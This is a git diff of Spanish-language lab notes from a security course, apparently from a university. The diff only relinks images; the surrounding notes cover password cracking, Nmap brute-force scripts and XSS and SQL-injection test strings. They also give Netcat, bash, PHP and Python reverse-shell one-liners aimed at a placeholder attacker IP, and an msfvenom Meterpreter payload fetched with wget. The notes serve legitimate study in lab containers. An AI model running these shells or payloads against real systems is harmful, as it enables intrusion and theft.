@@ -25,7 +25,7 @@
 	  - Instala el software `sudo apt install lynis` y verifica la versión `lynis show version`
 	  - Ejecuta: `lynis audit system` para validar tu máquina virtual
 - Nmap cheatsheet:
-![](Pasted%20image%2020230204113531.png)
+![](img/Pasted%20image%2020230204113531.png)
 - Para comprobar que una contraseña es segura visitar: https://password.kaspersky.com/
 - Habilitar el software de escaneo de malware / rootkits:
 	- Intalar el **tool Chkrootkit** (rootkits): `sudo apt install chkroot`
@@ -42,7 +42,7 @@
 - Para saber si una página web está identificada como maliciosa usar: https://transparencyreport.google.com/safe-browsing/search
 - ¿Cómo saber si una página web está ejecutando productos/frameworks con vulnerabilidades conocidas?. Esta info está contenida en las cabeceras http (producto, versión...)
 	- Usar el propio navegador:
-	 ![](Pasted%20image%2020230204121149.png)
+	 ![](img/Pasted%20image%2020230204121149.png)
 - Para ver las rutas que siguen los paquetes que mandas por la red usar el **tool traceroute**:
 	- Instalación: `sudo apt install tcptraceroute`
 	- Uso: `tcptraceroute www.domain.com`
@@ -95,9 +95,9 @@ sudo apt install gnome-keyring gnupg2 pass
 	- **tool Zmap**: es más rápido pero por defecto no funciona en redes locales
 	- **tool Nmap**: se usa para escaneos LAN en busca de máquinas "vivas"
 	- Cheat Sheet Zmap:
-![](Pasted%20image%2020230210162031.png)
+![](img/Pasted%20image%2020230210162031.png)
  - Cheat Sheet Nmap:
-![](Pasted%20image%2020230210162202.png)
+![](img/Pasted%20image%2020230210162202.png)
 - Para saber cómo cualquier sitio web usa tus datos de navegación para su propio provecho usar el **tool BlackLight** -> http://themarkup.org/blacklight
 - ¿Cómo crear un entorno de navegación más seguro?
 	- Para tratar con extensiones maliciosas: usar el **tool de navegador uBlock Origin**
@@ -106,9 +106,9 @@ sudo apt install gnome-keyring gnupg2 pass
 - Para comprobar si una de tus cuentas ha sido comprometida: usar la página https://haveibeenpwned.com/
 - Para geolocalizar al remitente de un correo electrónico: usar la página https://www.iplocation.net/
 	- Podemos obtener la ip de un correo para obtener de manera aproximada el remitente obtenido del campo `x-originating-ip`
-![](Pasted%20image%2020230210165124.png)
-![](Pasted%20image%2020230210165144.png)
-![](Pasted%20image%2020230210165202.png)
+![](img/Pasted%20image%2020230210165124.png)
+![](img/Pasted%20image%2020230210165144.png)
+![](img/Pasted%20image%2020230210165202.png)
 
 ---
 # 17 Febrero 2023 - Lab3 ⚱️
@@ -127,7 +127,7 @@ scp uo285176@ssiserver:/tmp/file . #para mandártelo de una máquina remota
 `gpg --symmetric --cipher-algo AES256 -c --armor supersecreto.txt`
 - Para desencriptar un fichero con gpg: `gpg --decrypt --output=juanito.txt mensaje-285176.txt.asc`
 - GPG Cheatsheet:
-![](Pasted%20image%2020230218123606.png)
+![](img/Pasted%20image%2020230218123606.png)
 - Para generar parámetros Diffie-Hellman: https://2ton.com.au/dhtool/
 - Para cifrar discos posteriormente a la instalación de Linux: https://www.howtogeek.com/116032/how-to-encrypt-your-home-folder-after-installing-ubuntu/
 - Para cifrar una carpeta y lo que contiene:
@@ -152,7 +152,7 @@ steghide --embed -cf imagen.jpg file.txt
 steghide --extract -sf imagen.jpg
 ````
 Steghide CheatSheet:
-![](Pasted%20image%2020230218131147.png)
+![](img/Pasted%20image%2020230218131147.png)
 - Para ofuscar un código Javascript para hacer más difícil que alguien averigue cómo  implementaste cierta funcionalidad:
 	- Copia tu código JavaScript
 	- Empaquétalo aquí (sin las etiquetas script y sin el HTML): http://dean.edwards.name/packer/
@@ -175,7 +175,7 @@ john --wordlist=ruta_wordlist pass.txt
 - Para más wordlists:  https://ns2.elhacker.net/wordlists/
 - Los archivos cifrados GPG no son directamente procesables con john, por lo que se han de procesar previamente con el **tool gpg2john**: `gpg2john file.asc > pass_to_crack`
 John the ripper Cheat sheet:
-![](Pasted%20image%2020230218133114.png)
+![](img/Pasted%20image%2020230218133114.png)
 - Para crackear la clave de un usuario con una wordlist personalizada usar el **tool John the Ripper**. También serán necesarios:
 	- Una herramienta para combinar el passwd filtrado y el archivo de shadow (**tool unshadow**)
 	- Un generador de wordlists como **tool crunch** `sudo apt install crunch`
@@ -212,7 +212,7 @@ Examples:
 #generar una wordlist de 10 letras minimo y maximo cada palabra con el patrón test%%%... y guardarla en el output
 crunch 10 10 -t test%%%... -o output.txt
 ````
-![](Pasted%20image%2020230218150622.png)
+![](img/Pasted%20image%2020230218150622.png)
 Nota: posteriormente, para crackear el fichero shadow con john usaremos el siguiente comando:
 `john -wordlist=/crunch_wordlist.txt /file_to_crack.txt`
 - Si usamos fuerza bruta pura con John The Ripper: `john --incremental -max-length=4 passwd.txt`
@@ -447,15 +447,15 @@ Aunque es posible que un par de entidades finales comiencen una conexión entre 
 - El lado cliente de una conexión realiza una apertura activa de un puerto enviando un paquete **SYN** inicial al  servidor como parte de la negociación en tres pasos. En el lado del servidor (este receptor también puede ser una PC o alguna estación terminal) se comprueba si el puerto está abierto, es decir, si existe algún proceso escuchando en ese puerto, pues se debe verificar que el dispositivo de destino tenga este servicio activo y esté aceptando peticiones en el número de puerto que el cliente intenta usar para la sesión. En caso de no estarlo, se envía al cliente un paquete de respuesta con el bit RST activado, lo que significa el rechazo del intento de conexión. 
 - En caso de que sí se encuentre abierto el puerto, el lado servidor respondería a la petición **SYN** válida con un paquete **SYN/ACK**.  
 - Finalmente, el cliente debería responderle al servidor con un **ACK**, completando así la negociación en tres pasos (SYN, SYN/ACK y ACK) y la fase de establecimiento de conexión. Es interesante notar que existe un  número de secuencia generado por cada lado, ayudando de este modo a que no se puedan establecer conexiones falseadas (**spoofing**)."
-![](Pasted%20image%2020230530150222.png)
+![](img/Pasted%20image%2020230530150222.png)
 
 ### Estructura de un paquete TCP
 Esta es la estructura de un paquete TCP. Aparte de los datos, otros campos importantes a recordar son los **puertos de origen y destino** (que indican qué puertos son el origen y el destino de la transmisión de datos), los seis flags (URG, ACK...) que se utilizan en algunos tipos de análisis, y el **tamaño de ventana**, que también se utiliza en otro tipo de análisis.
-![](Pasted%20image%2020230530150346.png)
+![](img/Pasted%20image%2020230530150346.png)
 
 ## Tipos de descubrimiento de hosts avanzados de Nmap
 - **Cheatsheet Nmap**:
-![](Pasted%20image%2020230530150451.png)
+![](img/Pasted%20image%2020230530150451.png)
 
 - **El motor de scripting (`--script=<nombre de script y parámetros>`)**: hay una categoría de scripts (**broadcast**) dedicada a descubrir diferentes tipos de servicios en una red (se puede ver en la cheatsheet). Más info en: https://nmap.org/nsedoc/categories/broadcast.html
 - Técnicas avanzadas de **detección**: se describen a continuación y expanden la cheatsheet anterior. Estas técnicas funcionan para los protocolos TCP e IP (y relacionados):
@@ -481,7 +481,7 @@ Esta es la estructura de un paquete TCP. Aparte de los datos, otros campos impor
 
 - Útil si queremos descubrir hosts protegidos por un firewall, tratando de saltarse la protección del mismo
 - Cheatsheet:
-![](Pasted%20image%2020230530154833.png)
+![](img/Pasted%20image%2020230530154833.png)
 
 Este cheatsheet nos muestra nos muestra dos formas de escaneo avanzadas:
 - El motor de script de Nmap, pero con otras categorías:
@@ -511,7 +511,7 @@ Este cheatsheet nos muestra nos muestra dos formas de escaneo avanzadas:
 	- `-sC` (Análisis de script predeterminado): equivalente a `--script-default`. Arranca los scripts adecuados para cada puerto pertenecientes a la categoría NSE default
 	- `-O` (Análisis de detección del SO): lo más probable es que se filtre. EVITARLO
 	- `-sV` (Análisis de versiones): sondea puertos para determinar información.
-![](Pasted%20image%2020230530160934.png)
+![](img/Pasted%20image%2020230530160934.png)
 
 ## Ejemplos más avanzados de Nmap
 
@@ -524,14 +524,14 @@ Este cheatsheet nos muestra nos muestra dos formas de escaneo avanzadas:
 	- **Análisis rápido:** `nmap -T4 -F 192.168.13.37` (-F escanea solo 100 puertos y rápido)
 	- **Verbose:** `nmap -T4 -A -v 192.168.13.37`
 
-![](Pasted%20image%2020230530161707.png)
+![](img/Pasted%20image%2020230530161707.png)
 
 ## Detección de tipo de sistema operativo sin "ruido"
 
 - Averiguar el SO de un objetivo sin ser detectado
 
 - Para evitar ser detectados, hay que jugar con el TTL (tiempo de vida) de los paquetes que enviamos al sistema mediante `ping` de la forma: `ping -c 1 <IP o nombre del destino>`. Recibiremos una respuesta que indica un valor **ttl** y lo comprobamos en la siguiente tabla:
-![](Pasted%20image%2020230530162300.png)
+![](img/Pasted%20image%2020230530162300.png)
 
 ## Formatos de salida de Nmap
 
@@ -553,7 +553,7 @@ Hay 3 formatos:
 - Si no queremos examinar el contenido de cada categoría, podemos localizar scripts con el comando `locate` seguido de un `grep` para el servicio que deseamos buscar. Por ejemplo: 
 	- `locate *.nse | grep smb`. Nota: si no funciona hacer `sudo updatedb`
 	- `ls | grep smb` (en la carpeta contenedora de los scripts)
-![](Pasted%20image%2020230530164556.png)
+![](img/Pasted%20image%2020230530164556.png)
 
 - No obstante, cada script tiene su propio conjunto de argumentos , por lo que hay que mirar su documentación.
 
@@ -561,23 +561,23 @@ Hay 3 formatos:
 
 ### Métodos de autenticación SSH
 - El script `ssh-auth-methods` localiza los métodos de autenticación aceptados por un servicio SSH de un objetivo. Uso recomendado: `sudo nmap -p22 --script ssh-auth-methods <IP-objetivo>`
-![](Pasted%20image%2020230530165622.png)
+![](img/Pasted%20image%2020230530165622.png)
 
 ### Fuerza bruta a servidores DNS
 - El script `dns-brute.nse` encontrará registros DNS `A` válidos probando una lista de subdominios comunes y buscando los que se resuelven correctamente. Encuentra subdominios asociados con un dominio principal de una organización, que pueden revelar nuevos objetivos sobre los que realizar evaluaciones de seguridad. Ejemplo: `nmap -p 80 --script dns-brute.nse <IP_OBJETIVO>`
-![](Pasted%20image%2020230530170308.png)
+![](img/Pasted%20image%2020230530170308.png)
 
 ### Buscar hosts en una IP
 - Encontrar hosts virtuales en la misma dirección IP (varios sitios web alojados en el mismo servidor). Esto se puede hacer mediante los scripts de `hostmap-*`. Ejemplo: `nmap -p 80 --script hostmap-bfk.nse <IP_OBJETIVO>`
-![](Pasted%20image%2020230530170753.png)
+![](img/Pasted%20image%2020230530170753.png)
 
 ### Geolocalización con traceroute
 - El script `traceroute-geolocation.nse` realiza un `traceroute` a la IP de destino y proporciona datos de geolocalización de cada salto de esa ruta. Esto hace que se puedan correlacionar los nombres DNS inversos de los enrutadores en dicha ruta con ubicaciones físicas. Ejemplo: `sudo nmap --traceroute --script traceroute-geolocation.nse -p 80 <IP_objetivo>`
-![](Pasted%20image%2020230530171104.png)
+![](img/Pasted%20image%2020230530171104.png)
 
 ### Geolocalización con bases de datos/servicios externos
 - Hay una serie de scripts que ayudan a geolocalizar una IP mediante bases de datos o servicios externos. Ejmplo: `ip-geolocation-geoplugin` https://nmap.org/nsedoc/scripts/ip-geolocation-geoplugin.html ---- http://www.geoplugin.com
-![](Pasted%20image%2020230530172048.png)
+![](img/Pasted%20image%2020230530172048.png)
 
 ## Recopilación de información HTTP
 ### Métodos HTTP
@@ -585,7 +585,7 @@ Hay 3 formatos:
 
 ### Captura del *banner* HTTP
 - Una de las formas típicas de determinar los tipos de servicios y sus versiones es preguntarles directamente qué son. Esto lo hacen leyendo la información del servicio que proporcionan cuando se conecta con ellos, lo que se conoce como "*banner grabbing*" Ejemplo: `nmap --script banner <IP_OBJETIVO>`
-![](Pasted%20image%2020230530173155.png)
+![](img/Pasted%20image%2020230530173155.png)
 
 ### Rutas comunes HTTP
 - El script `http-enum.nse`  encuentra rutas válidas en un servidor web por fuerza bruta para descubrir aplicaciones web que estén en uso. Ejemplos: `nmap --script http-enum <URL o IP objetivo>`, `nmap --script http-enum --script-args http-enum.basepath'pub/' <URL de destino o IP>`
@@ -596,13 +596,13 @@ Hay 3 formatos:
 ### Exploración de registros WHOIS
 - Estos registros pueden tener información interesante, como el nombre real del propietario de un dominio, datos de contacto... aunque con frecuencia estos datos pertenecen a una empresa de hosting. Más información: https://nmap.org/nsedoc/scripts/whois-ip.html. Sintaxis: `nmap --script whois-ip <URL o IP de destino>`  
 - Este script utiliza los datos de la IANA para encontrar una base de datos WHOIS y localizar la información que queremos. También podemos especificar el orden de servicios WHOIS que queremos utilizar: `nmap --script whois-ip –script-args whois.whodb-arin+ripe+afrinic <target IP>`. Podemos obtener más información en: https://nmap.org/nsedoc/scripts/whois-ip.html
-![](Pasted%20image%2020230530174538.png)
+![](img/Pasted%20image%2020230530174538.png)
 
 ## Malware y vulnerabilidades
 ### Malware
 - Otra utilidad del NSE es saber si un host ha sido identificado como fuente de malware o distribuidor de phishing. Esto es gracias a la API de Safe Browsing de Google ya que el script `http-google malware` pide a ese servicio este tipo de información. Tenemos que crearnos una API key en http://code.google.com/apis/safebrowsing/key_signup.html. Una vez registrados: `nmap -p80 --script http-google-malware --script-args http-google-malware.api-<API key> <IP o dirección del objetivo>`
 - Browsing de Google y VirusTotal también: `nmap -sV --script http-malware-host <URL o IP del objetivo>`
-![](Pasted%20image%2020230530175233.png)
+![](img/Pasted%20image%2020230530175233.png)
 
 ### Detección CVE  mediante Nmap. Scripts de terceros
 - El script `--script vuln` ejecuta una prueba de vulnerabilidades completa contra nuestro objetivo. Ejemplo: `nmap -Pn --script vuln <URL o OP_OBJETIVO>`. Es algo lento y es mejor volcar su salida a un fichero
@@ -611,7 +611,7 @@ Hay 3 formatos:
 	- Descargar la carpeta o el archivo .nse del script en la carpeta de scripts NSE  (`/usr/share/nmap/scripts`). En nuestro caso concreto sería hacer `git clone https://github.com/vulnersCom/nmap-vulners.git` una vez estemos en dicha carpeta.  
 	- Actualizar la base de datos de scripts nmap con `nmap --script-updatedb`
 - Ejecuta el script con: `sudo nmap -sV --script=nmap-vulners/ <ip>`
-![](Pasted%20image%2020230530180707.png)
+![](img/Pasted%20image%2020230530180707.png)
 
 ## Nmap y Metasploit Framework (MSF)
 - Integrar los resultados de un escaneo Nmap con Metasploit
@@ -670,7 +670,7 @@ done&
 
 ## Github
 - Para localizar secretos en repositorios públicos de Github
-![](Pasted%20image%2020230530185932.png)
+![](img/Pasted%20image%2020230530185932.png)
 
 ---
 # Lab10 ⚱️
@@ -753,7 +753,7 @@ Para comprobar si ModSecurity en el proxy está dando protección a los servidor
 
 ### WAF contra "el mal"
 - Cheatsheet para el **tool Nikto**:
-![](Pasted%20image%2020230531122345.png)
+![](img/Pasted%20image%2020230531122345.png)
 - Otra prueba que podemos hacer es usar algunos de los scripts HTTP nmap NSE que probamos en el laboratorio anterior contra el proxy, y ver si el resultado cambia o los intentos son registrados por ModSecurity.
 
 ## WAF contra ataques web
@@ -761,11 +761,11 @@ Para comprobar si ModSecurity en el proxy está dando protección a los servidor
 
 ### XSS
 - En lugar de pasar el ataque usando GET pondremos el payload del ataque como parámetro **POST** gracias a la opción `-d` del comando `curl` Para activar el WAF pasaremos una cadena de prueba XSS típica: `<script>alert('test')</alert>` con `curl <proxy IP>/-d "<script>alert('test')</script>"`
-![](Pasted%20image%2020230531130555.png)
+![](img/Pasted%20image%2020230531130555.png)
 
 ### Inyección SQL
 - Pasamos como parámetro **POST** a los usuarios de la cadena `DROP DATABASE;` Comprueba que sólo identifica la sintaxis SQL correcta introduciendo errores tipográficos en la cadena proporcionada para ver si la captura o no
-![](Pasted%20image%2020230531130651.png)
+![](img/Pasted%20image%2020230531130651.png)
 
 ## NIDS Suricata
 
@@ -795,13 +795,13 @@ Para comprobar si ModSecurity en el proxy está dando protección a los servidor
 - Modificar el fichero: `/etc/suricata/suricata.yaml`
 	- Asegurarnos de que la IP a proteger es la que aparece en la variable `HOME_NET`
 	- Cambiar el valor de esta variable a la IP de proxy que está en la misma red que el contenedor Kali atacante (lab10_front_net)
-	- ![](Pasted%20image%2020230531132037.png)
+	- ![](img/Pasted%20image%2020230531132037.png)
 	- Asegurate de que la interfaz de red que debe ser vigilada por Suricata es la correcta 
 - Habilitar las reglas que Suricata va a utilizar para examinar el tráfico:
 	- En el archivo anterior, el parámetro `default-rule-path` tiene como valor a la carpeta en la que copiamos las reglas Emerging Threats `default-rule-path: /var/lib/suricata/rules`
-	 ![](Pasted%20image%2020230531132705.png)
+	 ![](img/Pasted%20image%2020230531132705.png)
 	- Elegir las reglas que queremos activar y enumerarlas en una línea diferente (procedida por `-`) debajo de la entrada `rule-files` 
-	 ![](Pasted%20image%2020230531132912.png)
+	 ![](img/Pasted%20image%2020230531132912.png)
 
 ### Probar la funcionalidad de Suricata
 1. Conexión sospechosa desde el proxy al exterior del mismo (la máquina Ubuntu). Condiciones de la conexión:
@@ -820,7 +820,7 @@ Para comprobar si ModSecurity en el proxy está dando protección a los servidor
 
 - Usaremos el **tool dirb**
 - Cheatsheet de **dirb**
-![](Pasted%20image%2020230531221044.png)
+![](img/Pasted%20image%2020230531221044.png)
 - Un escaneo simple con **dirb**: `dirb <url>`
 
 ## Exfiltración a través de directorios compartidos por SMB (Exploit Public-Facing Application)
@@ -834,16 +834,16 @@ Para comprobar si ModSecurity en el proxy está dando protección a los servidor
 ### smbclient
 
 - Listar las carpetas compartidas para un sistema remoto: `smbclient -L fileserver`
-![](Pasted%20image%2020230531222501.png)
+![](img/Pasted%20image%2020230531222501.png)
 
 ### SMBMap
 
 - Escaneo por defecto: `smbmap -H <ip_objetivo>`
-![](Pasted%20image%2020230531223345.png)
+![](img/Pasted%20image%2020230531223345.png)
 - Enumerar un directorio particular: `smbmap -H <ip_objetivo> -r <directory>` 
-![](Pasted%20image%2020230531223329.png)
+![](img/Pasted%20image%2020230531223329.png)
 - Una vez encontramos el fichero `/etc/passwd` lo descargamos: `smbmap -H <ip_objetivo> --download <archivo>`
-![](Pasted%20image%2020230531224001.png)
+![](img/Pasted%20image%2020230531224001.png)
 
 ## Diccionarios de contraseñas de palabras comunes contra objetivos concretos (Valid Accounts)
 
@@ -851,7 +851,7 @@ Para comprobar si ModSecurity en el proxy está dando protección a los servidor
 
 - Vamos a generar una lista de palabras personalizada a partir del contenido de la página web de una víctima
 - Cheatsheet para generar lista de palabras con el **tool cewl**:
-![](Pasted%20image%2020230531224324.png)
+![](img/Pasted%20image%2020230531224324.png)
 - Tutorial sobre cómo usar cewl: https://esgeeks.com/como-utilizar-cewl/
 
 - Ejemplo con caracteres mínimos y salida a fichero: `cewl -c -m 5 <ip_objetivo> -w <fichero>`
@@ -861,26 +861,26 @@ Para comprobar si ModSecurity en el proxy está dando protección a los servidor
 - Para saber si los usuarios de un servicio remoto  usan una clave de una lista de palabras que tienes, y por tanto, algunas cuentas de usuario son fáciles de romper
 
 - Pasos:
-	- Primero hacemos un escaneo rápido con Nmap: `sudo nmap -sV -sS <ip_objetivo>` ![](Pasted%20image%2020230531224951.png)
+	- Primero hacemos un escaneo rápido con Nmap: `sudo nmap -sV -sS <ip_objetivo>` ![](img/Pasted%20image%2020230531224951.png)
 	- Localiza los scripts NSE adecuados que usen técnicas de fuerza bruta en `/usr/share/nmap/scripts`
-	 ![](Pasted%20image%2020230531225133.png)
+	 ![](img/Pasted%20image%2020230531225133.png)
 	 - Usa el hecho de que sabemos que un usuario válido en el sistema es `remotessiuser`
 	 - SOLUCIÓN:
 		 - Usaremos el script `ssh-brute`
-		 - Usaremos el siguiente comando: `nmap -p 22 --script ssh-brute --script-args userdb=users.lst,passdb=pass.lst <target>`![](Pasted%20image%2020230531230035.png)![](Pasted%20image%2020230531230046.png)
+		 - Usaremos el siguiente comando: `nmap -p 22 --script ssh-brute --script-args userdb=users.lst,passdb=pass.lst <target>`![](img/Pasted%20image%2020230531230035.png)![](img/Pasted%20image%2020230531230046.png)
 		 - Obtenemos la password `ingenieriainformatica`
-		 - Nos podemos conectar por ssh ![](Pasted%20image%2020230531230351.png) ![](Pasted%20image%2020230531230407.png)
+		 - Nos podemos conectar por ssh ![](img/Pasted%20image%2020230531230351.png) ![](img/Pasted%20image%2020230531230407.png)
 
 ## Netcat como herramienta de escucha (Command & Scripting Interpreter)
 
 - Para entender como funciona el **tool Netcat**
 
 - Cheatsheet del **tool Netcat**:
-![](Pasted%20image%2020230531232009.png)
+![](img/Pasted%20image%2020230531232009.png)
 
 - Para poner Netcat en modo escucha: `nc -lvp <port>`
 - Para enviar una peticion a cualquier puerto: `telnet <ip> <port>`
-![](Pasted%20image%2020230531231745.png)
+![](img/Pasted%20image%2020230531231745.png)
 
 ## Bind shell con Netcat (Command & Scripting Interpreter)
 
@@ -888,7 +888,7 @@ Para comprobar si ModSecurity en el proxy está dando protección a los servidor
 
 - Para obtener un bind shell en la máquina remota:
 	- Primero habilitaremos un listener en la máquina atacante: `nc -lvp <port>`
-	- Luego escribiremos el siguiente comando en la máquina objetivo: `nc <ip_attacker> <port> -e /bin/bash` ![](Pasted%20image%2020230531232648.png)
+	- Luego escribiremos el siguiente comando en la máquina objetivo: `nc <ip_attacker> <port> -e /bin/bash` ![](img/Pasted%20image%2020230531232648.png)
 	- Si ejecutamos: `python3 -c "import pty;pty.spawn('/bin/bash')"`, **obtenemos una shell completamente funcional**
 
 ## Reverse shell con Netcat (Command & Scripting Interpreter)
@@ -897,7 +897,7 @@ Para comprobar si ModSecurity en el proxy está dando protección a los servidor
 
 - Para crear una reverse shell:
 	- Primero habilitaremos un listener en la máquina atacante: `nc -lvp <port>`
-	- Luego escribiremos el siguiente comando en la máquina objetivo: `bash -i >& /dev/tcp/<ip_attacker>/<port> 0>&1` ![](Pasted%20image%2020230531233246.png)
+	- Luego escribiremos el siguiente comando en la máquina objetivo: `bash -i >& /dev/tcp/<ip_attacker>/<port> 0>&1` ![](img/Pasted%20image%2020230531233246.png)
 
 ## Reverse shell sin Netcat (Command & Scripting Interpreter)
 
@@ -905,7 +905,7 @@ Para comprobar si ModSecurity en el proxy está dando protección a los servidor
 
 - Para crear un reverse shell con **php**:
 	- Primero habilitaremos un listener en la máquina atacante: `nc -lvp <port>`
-	- Luego escribiremos el siguiente comando en la máquina objetivo: `php -r '$sock=fsockopen("<ip_attacker>",<port>);exec("/bin/sh -i <&3 >&3 2>&3");'` ![](Pasted%20image%2020230531234255.png)
+	- Luego escribiremos el siguiente comando en la máquina objetivo: `php -r '$sock=fsockopen("<ip_attacker>",<port>);exec("/bin/sh -i <&3 >&3 2>&3");'` ![](img/Pasted%20image%2020230531234255.png)
 - Para crear un reverse shell con python:
 	- Primero habilitaremos un listener en la máquina atacante: `nc -lvp <port>`
 	- Luego escribiremos el siguiente comando en la máquina objetivo: `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<ip_attacker>",<port>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`
@@ -917,11 +917,11 @@ Para comprobar si ModSecurity en el proxy está dando protección a los servidor
 - Tutorial: https://www.exploit-db.com/searchsploit
 
 - Cheatsheet de Searchsploit:
-![](Pasted%20image%2020230531234850.png)
+![](img/Pasted%20image%2020230531234850.png)
 
 - Para buscar los exploits de una máquina de una forma automatizada:
 	- Hacer un escaneo nmap completo de lo que queramos y guardarlo en un xml: `sudo nmap -sV -sS <ip_objetivo> -oX <fichero.xml>`
-	- Introducimos el siguiente comando en searchsploit: `searchsploit --nmap <fichero_nmap.xml>` ![](Pasted%20image%2020230531235248.png)
+	- Introducimos el siguiente comando en searchsploit: `searchsploit --nmap <fichero_nmap.xml>` ![](img/Pasted%20image%2020230531235248.png)
 	- También podemos buscar el exploit equivalente en la web: https://www.exploit-db.com/
 
 
@@ -946,17 +946,17 @@ Para comprobar si ModSecurity en el proxy está dando protección a los servidor
 
 ### Uso básico de MSF
 - Una vez arrancado `msf` debemos asegurarnos de que funciona bien. Para ello, escribimos `db_status` y debemos ver el siguiente mensaje:
-![](Pasted%20image%2020230601114015.png)
+![](img/Pasted%20image%2020230601114015.png)
 - Ahora podemos empezar a organizar nuestras actividades usando los *workspaces*. Esto nos da la capacidad de guardar escaneos a diferentes **ubicaciones/redes/subredes**. 
 - Si usamos el comando `workspace` desde **msfconsole** se mostrarán los espacios de trabajo que existen actualmente 
-![](Pasted%20image%2020230601114218.png)
+![](img/Pasted%20image%2020230601114218.png)
 - Para crear un nuevo workspace: `workspace -a <nombre>`
 - Para eliminar un workspace: `workspace -d <nombre>`
 - Para cambiar de workspace: `workspace <nombre>`
 
 ### Entender la cadena típica de eventos de un exploit
 - Cheatsheet de **Metasploit**:
-![](Pasted%20image%2020230601114515.png)
+![](img/Pasted%20image%2020230601114515.png)
 
 ### Encontrar un exploit que vayamos a usar
 - Primero realizaremos un escaneo con **Nmap** independiente o bien con el nmap integrado de **metasploit**. El objetivo es buscar exploits aplicables a los servicios y sus versiones concretas encontrados en la base de datos de **Metasploit**. Esta base de datos se puede consultar aquí: https://www.rapid7.com/db/?type=metasploit. También puedes agregar exploits de **searchsploit** a MSF.
@@ -964,8 +964,8 @@ Para comprobar si ModSecurity en el proxy está dando protección a los servidor
 - Una vez tengas los servicios y versiones, busca en la base de datos CVE (http://www.cvedetails.com/) los exploits disponibles para los servicios que encontraste
 - Localizar más exploits en: http://www.exploit-db.com/
 - Ahora buscamos el exploit en Metasploit con: `search <palabras clave>`
-![](Pasted%20image%2020230601115634.png)
-![](Pasted%20image%2020230601120514.png)
+![](img/Pasted%20image%2020230601115634.png)
+![](img/Pasted%20image%2020230601120514.png)
 
 ### Ejecución de un exploit
 - Una vez que lo hemos encontrado, usaremos el siguiente comando: `use <exploit> - set payload <payload> - show options - set options <...> - exploit`
@@ -979,36 +979,36 @@ Para comprobar si ModSecurity en el proxy está dando protección a los servidor
 			- Necesitamos elegir entre un Meterpreter o un shell estándar (mejor probar Meterpreter)
 			- Se trata de una arquitectura x64
 			- Luego podemos elegir entre un **Stager** o un payload inline (**stageless**). (en Docker el segundo funciona mejor)
-			- Elige el payload que cumpla con estas condiciones con: `set payload <nombre>`![](Pasted%20image%2020230601120455.png)![](Pasted%20image%2020230601120651.png)
+			- Elige el payload que cumpla con estas condiciones con: `set payload <nombre>`![](img/Pasted%20image%2020230601120455.png)![](img/Pasted%20image%2020230601120651.png)
 	- Resto de parámetros:
 		- Una vez elegido el payload, consulta la información detallada del exploit con `info <nombre_exploit>` para ver sus opciones y resto de los parámetros
-		- **NOTA**: también se puede usar el comando `options` y verlo manualmente ![](Pasted%20image%2020230601120926.png)
-		- Vemos que nos falta por configurar: RHOSTS y LHOST. Los configuramos y ejecutamos el exploit con: `set RHOSTS <IP_ATTACKER>` Y `set LHOST <IP_OBJETIVO>` ![](Pasted%20image%2020230601121150.png)
+		- **NOTA**: también se puede usar el comando `options` y verlo manualmente ![](img/Pasted%20image%2020230601120926.png)
+		- Vemos que nos falta por configurar: RHOSTS y LHOST. Los configuramos y ejecutamos el exploit con: `set RHOSTS <IP_ATTACKER>` Y `set LHOST <IP_OBJETIVO>` ![](img/Pasted%20image%2020230601121150.png)
 - Lamentablemente, parece no ser vulnerable :(
-![](Pasted%20image%2020230601121745.png)
+![](img/Pasted%20image%2020230601121745.png)
 
 ### Uso de módulos auxiliares de MSF
 - Vamos a hacer fuerza bruta a un servidor FTP presente en el contenedor de Ubuntu.
 - Para ello:
 	- El módulo auxiliar se denomina `ftp_login`
-	- Lo usamos: `use <nombre>` ![](Pasted%20image%2020230601122121.png)
+	- Lo usamos: `use <nombre>` ![](img/Pasted%20image%2020230601122121.png)
 	- Da permisos de lectura para todos al archivo `/wordlist/2020mostcommon.txt`
-	- Establece las opciones adecuadas para lanzar el exploit ![](Pasted%20image%2020230601122600.png) ![](Pasted%20image%2020230601122722.png)
+	- Establece las opciones adecuadas para lanzar el exploit ![](img/Pasted%20image%2020230601122600.png) ![](img/Pasted%20image%2020230601122722.png)
 
 ## Payloads con msfvenom y multi/handler
 
 - Para crear un payload personalizado para tratar de explotar una página web vulnerable
 - Cheatsheet msfvenom:
-![](Untitled.png)
+![](img/Untitled.png)
 
 - El **tool msfvenom** es una aplicación que genera payloads en diferentes lenguajes de programación con diversos efectos maliciosos. Uno de los más típicos es ejecutar un reverse shell de Meterpreter en un sistema infectado
 - Vamos a probar esto:
 	- Inicia sesión en el contenedor de ubuntu como usuario sin privilegios (**testUser**)
 	- El contenedor de escalada de privilegios Ubuntu puede ejecutar páginas web PHP con `php <fichero_php>` y cualquier usuario puede escribir páginas web en el directorio por defecto `/var/www/html`
 	- El contenedor Ubuntu está en una IP fija
-	- Creamos un payload de Meterpreter reverse shell con PHP (más info en: https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/): `msfvenom -p php/meterpreter_reverse_tcp LHOST=<tu dirección IP> LPORT=<tu puerto> -f raw > shell.php` ![](Pasted%20image%2020230601124144.png)
-	- Ahora, para transferirlo a la máquina objetivo, creamos un servidor de python para leer archivos en un puerto determinado con: `python3 -m http.server <port>` ![](Pasted%20image%2020230601124901.png)
-	- Ahora transferimos el archivo con: `wget http://<ip>:<port>/<file>` ![](Pasted%20image%2020230601130749.png)
+	- Creamos un payload de Meterpreter reverse shell con PHP (más info en: https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/): `msfvenom -p php/meterpreter_reverse_tcp LHOST=<tu dirección IP> LPORT=<tu puerto> -f raw > shell.php` ![](img/Pasted%20image%2020230601124144.png)
+	- Ahora, para transferirlo a la máquina objetivo, creamos un servidor de python para leer archivos en un puerto determinado con: `python3 -m http.server <port>` ![](img/Pasted%20image%2020230601124901.png)
+	- Ahora transferimos el archivo con: `wget http://<ip>:<port>/<file>` ![](img/Pasted%20image%2020230601130749.png)
 	- Como el payload no se ejecutará dentro de msf, sino en la máquina remota, crea un payload listener `multi/handler` de la siguiente forma (usa un Stageless porque es un contenedor):
 ````bash
 use exploit/multi/handler
@@ -1018,10 +1018,10 @@ set LPORT 4444
 ````
 - Ejecuta el exploit en segundo plano: `exploit -j`
 - Ahora ejecutamos el shell.php en la máquina víctima: `php -f shell.php`
